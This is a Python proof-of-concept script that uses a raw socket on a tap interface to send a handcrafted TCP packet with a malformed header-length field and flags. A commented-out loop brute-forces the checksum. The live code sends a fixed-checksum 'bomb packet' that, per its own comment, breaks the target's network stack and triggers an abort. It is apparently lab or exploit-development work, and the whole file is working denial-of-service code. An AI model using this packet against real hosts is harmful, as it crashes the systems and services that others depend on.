#!/bin/python3
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import os
import hexdump
import socket
import time


if os.geteuid() != 0:
    exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind(("tap0", 0))

# send(IP(dst="192.168.0.2")/TCP(dport=80, options=[('NOP', 0), ('NOP', 0)]))
pkt = bytes(bytearray.fromhex("0102030405065a4272f9a33808004500002c000100004006f977c0a80001c0a8000200140050000000000000000060022000fd25000001010000"))

# pkt = pkt[:0x10] + b"\x00\xff" + pkt[0x12:] # IP header: ength

pkt = pkt[:0x30-2] + b"\xf0\x02" + pkt[0x30:] # header length * tcp flags

### full search (very stupid)
# # for checksum in range(256 * 256):
# for checksum in range(0x6d25, 256 * 256):
#     print("[*] checksum = %#x" % (checksum))
#     pkt = pkt[:0x32] + struct.pack('!H', checksum) + pkt[0x34:] # checksum
#     hexdump.hexdump(pkt)
#     s.send(pkt)
#     # time.sleep(0.001) # no need

### Breaks Stack & Triggers SIGABORT
checksum = 0x6d25
pkt = pkt[:0x32] + struct.pack('!H', checksum) + pkt[0x34:] # checksum
hexdump.hexdump(pkt)
s.send(pkt) # bomb packet